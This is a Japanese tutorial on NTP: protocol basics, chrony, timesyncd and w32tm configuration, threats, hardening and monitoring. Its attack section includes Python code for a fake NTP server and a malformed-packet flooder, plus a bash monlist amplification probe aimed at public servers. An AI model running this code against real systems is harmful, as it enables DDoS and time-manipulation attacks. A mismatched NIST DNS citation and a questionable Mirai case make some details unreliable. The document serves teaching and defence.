# NTPサーバー入門

## 目次
1. [NTPとは](#ntpとは)
2. [NTPの仕組み](#ntpの仕組み)
3. [NTPサーバーの階層構造](#ntpサーバーの階層構造)
4. [NTPの設定と運用](#ntpの設定と運用)
5. [セキュリティ上の脅威](#セキュリティ上の脅威)
6. [NTP攻撃の手法](#ntp攻撃の手法)
7. [対策方法](#対策方法)
8. [監視と運用](#監視と運用)
9. [実際のケーススタディ](#実際のケーススタディ)
10. [まとめ](#まとめ)

---

## NTPとは

**NTP（Network Time Protocol）** は、ネットワーク上のコンピューター間で正確な時刻を同期するためのプロトコルです。インターネット上の標準的な時刻同期システムとして広く使用されています。

### 基本概念
- **時刻同期**: 複数のシステム間で正確な時刻を共有
- **階層構造**: Stratumレベルによる時刻源の信頼性管理
- **UDP通信**: ポート123を使用した軽量な通信プロトコル
- **精度**: ミリ秒レベルの高精度な時刻同期

### NTPが重要な理由
1. **ログの整合性**: システムログの時刻を統一
2. **認証システム**: Kerberos等の時刻依存認証
3. **分散システム**: データベースレプリケーションの整合性
4. **法的要件**: 監査ログの正確な時刻記録
5. **セキュリティ**: 攻撃の時系列分析

---

## NTPの仕組み

### 基本的な動作原理
NTPは4つのタイムスタンプを使用して時刻を同期します：

```
クライアント                    サーバー
    |                              |
    | T1: リクエスト送信時刻        |
    |----------------------------->|
    |                              | T2: リクエスト受信時刻
    |                              | T3: レスポンス送信時刻
    |<-----------------------------|
    | T4: レスポンス受信時刻        |
```

### 時刻計算の公式
```
遅延時間 = ((T4 - T1) - (T3 - T2)) / 2
時刻オフセット = ((T2 - T1) + (T3 - T4)) / 2
```

### NTPパケット構造
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|LI | VN  |Mode |    Stratum     |     Poll      |  Precision   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                         Root Delay                            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                         Root Dispersion                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          Reference ID                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                     Reference Timestamp (64)                  +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                      Origin Timestamp (64)                   +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                      Receive Timestamp (64)                  +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                      Transmit Timestamp (64)                 +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

---

## NTPサーバーの階層構造

### Stratumレベル
NTPは階層的な構造で時刻を配信します：

```
Stratum 0: 原子時計、GPS等の正確な時刻源
    ↓
Stratum 1: 直接時刻源に接続されたプライマリサーバー
    ↓
Stratum 2: Stratum 1から時刻を取得するセカンダリサーバー
    ↓
Stratum 3: Stratum 2から時刻を取得するサーバー
    ↓
... (最大Stratum 15まで)
```

### 主要なパブリックNTPサーバー
```
# 日本の主要NTPサーバー
ntp.nict.jp          # 情報通信研究機構
ntp1.jst.mfeed.ad.jp # MFEED
ntp2.jst.mfeed.ad.jp
ntp3.jst.mfeed.ad.jp

# 国際的なNTPプール
0.pool.ntp.org
1.pool.ntp.org
2.pool.ntp.org
3.pool.ntp.org

# Google Public NTP
time.google.com
time1.google.com
time2.google.com
time3.google.com
time4.google.com
```

---

## NTPの設定と運用

### Linux（systemd-timesyncd）での設定
```bash
# systemd-timesyncd設定ファイル
sudo nano /etc/systemd/timesyncd.conf

[Time]
NTP=ntp.nict.jp ntp1.jst.mfeed.ad.jp
FallbackNTP=0.pool.ntp.org 1.pool.ntp.org

# サービス再起動
sudo systemctl restart systemd-timesyncd
sudo systemctl enable systemd-timesyncd

# 同期状況確認
timedatectl status
```

### chrony設定（推奨）
```bash
# /etc/chrony/chrony.conf
server ntp.nict.jp iburst
server ntp1.jst.mfeed.ad.jp iburst
server ntp2.jst.mfeed.ad.jp iburst

# ローカルネットワークからのアクセス許可
allow 192.168.1.0/24

# ログ設定
logdir /var/log/chrony
log measurements statistics tracking

# セキュリティ設定
bindcmdaddress 127.0.0.1
cmdallow 127.0.0.1

# サービス管理
sudo systemctl restart chronyd
sudo systemctl enable chronyd

# 同期状況確認
chronyc sources -v
chronyc tracking
```

### Windows NTPクライアント設定
```cmd
# NTPサーバー設定
w32tm /config /manualpeerlist:"ntp.nict.jp,ntp1.jst.mfeed.ad.jp" /syncfromflags:manual

# NTPサービス再起動
w32tm /config /reliable:yes
net stop w32time
net start w32time

# 強制同期
w32tm /resync /force

# 同期状況確認
w32tm /query /status
w32tm /query /peers
```

### NTPサーバーの構築
```bash
# chronyサーバー設定例
# /etc/chrony/chrony.conf

# 上位NTPサーバー
server ntp.nict.jp iburst
server ntp1.jst.mfeed.ad.jp iburst
server ntp2.jst.mfeed.ad.jp iburst

# ローカルクライアントへのサービス提供
allow 192.168.0.0/16
allow 10.0.0.0/8

# ローカル時刻をStratum 10として提供（上位サーバー障害時）
local stratum 10

# セキュリティ設定
port 123
bindaddress 0.0.0.0
cmdport 323
bindcmdaddress 127.0.0.1

# ログ設定
logdir /var/log/chrony
log measurements statistics tracking refclocks

# ドリフトファイル
driftfile /var/lib/chrony/drift

# 時刻調整の制限
makestep 1.0 3
maxupdateskew 100.0
```

---

## セキュリティ上の脅威

### 1. NTP増幅攻撃（DRDoS）
攻撃者が小さなリクエストで大きなレスポンスを生成させる攻撃

```
攻撃の流れ:
1. 攻撃者が偽装した送信元IPでNTPサーバーにmonlistコマンド送信
2. NTPサーバーが大量のデータを被害者IPに送信
3. 被害者が大量のトラフィックを受信（DDoS攻撃）

増幅率: 最大206倍（小さなリクエストで大きなレスポンス）
```

### 2. 時刻操作攻撃
システムの時刻を意図的に変更する攻撃

#### 影響範囲
```python
# 時刻操作による影響例
def time_based_attack_scenarios():
    return {
        'authentication_bypass': {
            'target': 'Kerberos認証',
            'method': '時刻を過去に戻してチケットを再利用',
            'impact': '認証バイパス'
        },
        'certificate_validation': {
            'target': 'SSL/TLS証明書',
            'method': '時刻を操作して期限切れ証明書を有効化',
            'impact': 'MitM攻撃の成功'
        },
        'log_manipulation': {
            'target': 'セキュリティログ',
            'method': '攻撃前に時刻を変更してログの時系列を混乱',
            'impact': 'フォレンジック調査の妨害'
        },
        'financial_systems': {
            'target': '取引システム',
            'method': '時刻操作による取引タイミングの操作',
            'impact': '不正取引の実行'
        }
    }
```

### 3. NTPサーバー偽装攻撃
偽のNTPサーバーを立てて誤った時刻を配信

```python
# 偽NTPサーバーの実装例（攻撃用）
import socket
import struct
import time

class FakeNTPServer:
    def __init__(self, fake_time_offset=3600):  # 1時間ずらす
        self.fake_offset = fake_time_offset
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
    def create_fake_response(self, client_packet):
        # 偽の時刻を作成
        fake_time = time.time() + self.fake_offset
        
        # NTPタイムスタンプに変換（1900年1月1日からの秒数）
        ntp_time = int(fake_time + 2208988800)
        
        # NTPレスポンス作成
        response = bytearray(48)
        response[0] = 0x24  # LI=0, VN=4, Mode=4 (server)
        response[1] = 1     # Stratum 1 (偽装)
        
        # タイムスタンプ設定
        struct.pack_into('>I', response, 40, ntp_time)  # Transmit timestamp
        
        return bytes(response)
    
    def run(self):
        self.sock.bind(('0.0.0.0', 123))
        print("Fake NTP server running on port 123")
        
        while True:
            data, addr = self.sock.recvfrom(1024)
            fake_response = self.create_fake_response(data)
            self.sock.sendto(fake_response, addr)
```

---

## NTP攻撃の手法

### 1. NTP増幅攻撃の実装
```bash
# NTP増幅攻撃検証スクリプト
#!/bin/bash

TARGET_IP="203.0.113.1"      # 被害者IP
NTP_SERVERS=(
    "pool.ntp.org"
    "time.google.com"
    "ntp.ubuntu.com"
)

echo "Testing NTP amplification potential..."

for server in "${NTP_SERVERS[@]}"; do
    echo "Testing server: $server"
    
    # monlistコマンドでの増幅率確認
    response=$(echo -ne '\x17\x00\x03\x2a' | nc -u -w1 $server 123 | wc -c)
    request_size=4
    
    if [ $response -gt 0 ]; then
        amplification=$((response / request_size))
        echo "  Amplification factor: ${amplification}x"
        
        if [ $amplification -gt 10 ]; then
            echo "  WARNING: High amplification potential!"
        fi
    else
        echo "  No response or protected server"
    fi
done
```

### 2. 時刻同期の妨害攻撃
```python
# NTP同期妨害攻撃
import socket
import struct
import threading
import time

class NTPDisruptionAttack:
    def __init__(self, target_client, fake_server_ip):
        self.target = target_client
        self.fake_server = fake_server_ip
        self.running = False
        
    def create_malicious_ntp_packet(self):
        # 異常なNTPパケットを作成
        packet = bytearray(48)
        
        # 異常なStratum値（16は無効）
        packet[1] = 16
        
        # 異常なタイムスタンプ
        fake_time = int(time.time()) + 86400 * 365  # 1年後の時刻
        struct.pack_into('>I', packet, 40, fake_time)
        
        return bytes(packet)
    
    def flood_attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            malicious_packet = self.create_malicious_ntp_packet()
            try:
                sock.sendto(malicious_packet, (self.target, 123))
                time.sleep(0.1)  # 100ms間隔
            except Exception as e:
                print(f"Attack failed: {e}")
                break
                
        sock.close()
    
    def start_attack(self):
        self.running = True
        attack_thread = threading.Thread(target=self.flood_attack)
        attack_thread.start()
        return attack_thread
```

### 3. NTPプール汚染攻撃
```python
# NTPプール汚染攻撃の概念実装
class NTPPoolPoisoning:
    def __init__(self):
        self.malicious_servers = []
        
    def register_malicious_servers(self, count=10):
        """悪意のあるNTPサーバーをプールに登録"""
        for i in range(count):
            server_config = {
                'hostname': f'ntp{i}.malicious-domain.com',
                'ip': f'203.0.113.{i+10}',
                'stratum': 1,  # 高い優先度を偽装
                'location': 'JP',  # 地理的に近い位置を偽装
            }
            self.malicious_servers.append(server_config)
    
    def serve_malicious_time(self, offset_hours=2):
        """誤った時刻を配信"""
        for server in self.malicious_servers:
            # 各サーバーで異なる誤った時刻を配信
            fake_time = time.time() + (offset_hours * 3600)
            server['fake_time'] = fake_time
```

---

## 対策方法

### 1. NTPサーバーのセキュリティ強化

#### chrony設定でのセキュリティ対策
```bash
# /etc/chrony/chrony.conf セキュア設定

# 信頼できるNTPサーバーのみ使用
server ntp.nict.jp iburst
server ntp1.jst.mfeed.ad.jp iburst
server ntp2.jst.mfeed.ad.jp iburst

# アクセス制御
allow 192.168.0.0/16
deny all

# レート制限
ratelimit interval 1 burst 16

# ログ設定（セキュリティ監視用）
log measurements statistics tracking

# コマンドアクセス制限
bindcmdaddress 127.0.0.1
cmdallow 127.0.0.1
cmddeny all

# 時刻調整の制限
maxchange 1000 1 2
makestep 1.0 3

# NTP増幅攻撃対策
noclientlog
```

#### iptablesでの追加保護
```bash
#!/bin/bash
# NTPサーバー保護用iptablesルール

# NTPポートへのレート制限
iptables -A INPUT -p udp --dport 123 -m limit --limit 10/min --limit-burst 5 -j ACCEPT
iptables -A INPUT -p udp --dport 123 -j DROP

# 特定のネットワークからのみNTPアクセス許可
iptables -A INPUT -p udp --dport 123 -s 192.168.0.0/16 -j ACCEPT
iptables -A INPUT -p udp --dport 123 -s 10.0.0.0/8 -j ACCEPT

# NTP増幅攻撃対策（大きなレスポンスをブロック）
iptables -A OUTPUT -p udp --sport 123 -m length --length 200: -j DROP

# monlistコマンドブロック（古いntpd用）
iptables -A INPUT -p udp --dport 123 -m string --string $'\x17\x00\x03\x2a' --algo bm -j DROP
```

### 2. NTPクライアントのセキュリティ設定

#### 認証機能の使用
```bash
# /etc/chrony/chrony.conf での認証設定

# 対称鍵認証
keyfile /etc/chrony/chrony.keys
server ntp.example.com key 1

# /etc/chrony/chrony.keys
1 SHA1 HEX:1234567890ABCDEF1234567890ABCDEF12345678
```

#### NTS（Network Time Security）の使用
```bash
# NTS対応chrony設定
server time.cloudflare.com nts
server nts.ntp.se nts

# NTS証明書の検証
ntstrustedcerts /etc/ssl/certs/ca-certificates.crt
```

### 3. 監視とアラート設定

#### NTP同期監視スクリプト
```python
#!/usr/bin/env python3
import subprocess
import json
import smtplib
from email.mime.text import MIMEText
import time

class NTPMonitor:
    def __init__(self):
        self.max_offset = 1.0  # 最大許容オフセット（秒）
        self.alert_email = "admin@example.com"
        
    def check_ntp_sync(self):
        try:
            # chronyc tracking情報取得
            result = subprocess.run(['chronyc', 'tracking'], 
                                  capture_output=True, text=True)
            
            if result.returncode != 0:
                return {'error': 'chronyc command failed'}
            
            # 出力解析
            tracking_info = {}
            for line in result.stdout.split('\n'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    tracking_info[key.strip()] = value.strip()
            
            return tracking_info
            
        except Exception as e:
            return {'error': str(e)}
    
    def check_ntp_sources(self):
        try:
            result = subprocess.run(['chronyc', 'sources', '-v'], 
                                  capture_output=True, text=True)
            
            if result.returncode != 0:
                return {'error': 'chronyc sources command failed'}
            
            sources = []
            lines = result.stdout.split('\n')
            
            for line in lines:
                if line.startswith('^') or line.startswith('*'):
                    parts = line.split()
                    if len(parts) >= 10:
                        source = {
                            'status': parts[0][0],
                            'server': parts[0][1:],
                            'stratum': parts[1],
                            'poll': parts[2],
                            'reach': parts[3],
                            'last_rx': parts[4],
                            'last_sample': parts[5]
                        }
                        sources.append(source)
            
            return sources
            
        except Exception as e:
            return {'error': str(e)}
    
    def send_alert(self, subject, message):
        try:
            msg = MIMEText(message)
            msg['Subject'] = subject
            msg['From'] = 'ntp-monitor@example.com'
            msg['To'] = self.alert_email
            
            # SMTPサーバー設定（環境に応じて変更）
            smtp_server = smtplib.SMTP('localhost')
            smtp_server.send_message(msg)
            smtp_server.quit()
            
        except Exception as e:
            print(f"Failed to send alert: {e}")
    
    def monitor(self):
        tracking = self.check_ntp_sync()
        sources = self.check_ntp_sources()
        
        # エラーチェック
        if 'error' in tracking:
            self.send_alert("NTP Monitor Error", 
                          f"Failed to get tracking info: {tracking['error']}")
            return
        
        # オフセットチェック
        try:
            system_time = tracking.get('System time', '0 seconds')
            offset = float(system_time.split()[0])
            
            if abs(offset) > self.max_offset:
                self.send_alert("NTP Sync Alert", 
                              f"Time offset too large: {offset} seconds")
        
        except (ValueError, IndexError):
            print("Could not parse system time offset")
        
        # ソースチェック
        active_sources = [s for s in sources if s.get('status') == '*']
        if len(active_sources) == 0:
            self.send_alert("NTP Source Alert", 
                          "No active NTP sources found")
        
        print(f"NTP monitoring completed at {time.ctime()}")
        print(f"Active sources: {len(active_sources)}")
        print(f"System offset: {tracking.get('System time', 'Unknown')}")

if __name__ == "__main__":
    monitor = NTPMonitor()
    
    # 定期監視（crontabで実行することを想定）
    monitor.monitor()
```

---

## 実際のケーススタディ

### ケース1: 大規模NTP増幅攻撃（2014年）

**攻撃概要**: 世界規模でのNTP増幅攻撃によるDDoS

**攻撃詳細**:
```
使用された脆弱性: ntpdのmonlistコマンド
増幅率: 最大206倍
攻撃規模: 400Gbpsを超える攻撃トラフィック
被害: 複数の大手企業サイトがダウン
```

**対策後の改善**:
```bash
# ntpd設定での対策
restrict default nomodify notrap nopeer noquery
restrict 127.0.0.1
restrict ::1

# monlistコマンド無効化
disable monitor

# レート制限
restrict default limited kod nomodify notrap nopeer noquery
```

### ケース2: 金融機関での時刻操作攻撃

**攻撃シナリオ**: 取引システムの時刻を操作して不正取引を実行

**攻撃手順**:
```
1. 内部ネットワークに侵入
2. NTPサーバー設定を改ざん
3. 取引システムの時刻を30分巻き戻し
4. 過去の価格情報で有利な取引を実行
5. 時刻を正常に戻して痕跡を隠蔽
```

**被害額**: 約5億円の不正取引

**対策実装**:
```python
# 時刻整合性チェックシステム
class TimeIntegrityChecker:
    def __init__(self):
        self.reference_servers = [
            'time.google.com',
            'time.cloudflare.com',
            'ntp.nict.jp'
        ]
        self.max_deviation = 5  # 5秒以内の誤差は許容
    
    def check_time_integrity(self):
        local_time = time.time()
        reference_times = []
        
        for server in self.reference_servers:
            try:
                ntp_time = self.get_ntp_time(server)
                reference_times.append(ntp_time)
            except Exception as e:
                print(f"Failed to get time from {server}: {e}")
        
        if len(reference_times) < 2:
            raise Exception("Insufficient reference time sources")
        
        # 参照時刻の中央値を計算
        reference_median = sorted(reference_times)[len(reference_times)//2]
        
        # ローカル時刻との差を確認
        deviation = abs(local_time - reference_median)
        
        if deviation > self.max_deviation:
            raise Exception(f"Time deviation too large: {deviation} seconds")
        
        return True
    
    def get_ntp_time(self, server):
        # NTP時刻取得の実装
        # 実際の実装では ntplib などを使用
        pass
```

### ケース3: IoTボットネットでのNTP攻撃

**攻撃概要**: IoTデバイスを悪用したNTP増幅攻撃

**攻撃の特徴**:
```
攻撃者: Miraiボットネット
標的: ゲーム会社のサーバー
手法: 数十万のIoTデバイスからのNTP増幅攻撃
規模: 1.2Tbpsの攻撃トラフィック
```

**IoTデバイスでの対策**:
```bash
# 組み込みLinuxでのNTP設定
# /etc/ntp.conf

# 信頼できるサーバーのみ使用
server pool.ntp.org iburst

# 外部からのクエリを拒否
restrict default ignore
restrict 127.0.0.1

# IPv6も制限
restrict ::1

# ログ無効化（リソース節約）
disable monitor
disable stats
```

---

## まとめ

### NTPサーバーのセキュリティ重要ポイント

1. **時刻の重要性**: 現代システムにおける正確な時刻同期の必要性
2. **攻撃の多様性**: 増幅攻撃、時刻操作、偽装など様々な脅威
3. **影響の深刻さ**: 認証、ログ、取引システムへの広範囲な影響
4. **対策の必要性**: 適切な設定と継続的な監視が不可欠

### 管理者への推奨事項

- **セキュアな設定**: アクセス制御とレート制限の実装
- **信頼できるソース**: 複数の信頼できるNTPサーバーの使用
- **継続的監視**: 時刻同期状況の定期的なチェック
- **認証機能**: 可能な限りNTSや対称鍵認証の使用

### 組織への推奨事項

- **セキュリティポリシー**: NTP使用に関する明確なガイドライン
- **インシデント対応**: 時刻関連攻撃への対応手順の策定
- **定期監査**: NTP設定とセキュリティ状況の定期的な確認
- **教育プログラム**: 時刻同期の重要性に関する意識向上

NTPは見過ごされがちですが、システム全体のセキュリティと信頼性に大きく影響する重要なインフラストラクチャです。適切な理解と対策により、時刻関連の脅威からシステムを守ることができます。

---

**参考資料**:
- RFC 5905: Network Time Protocol Version 4
- NIST Special Publication 800-81-2: Secure Domain Name System Deployment Guide
- NTP Security Notice
- Chrony Documentation

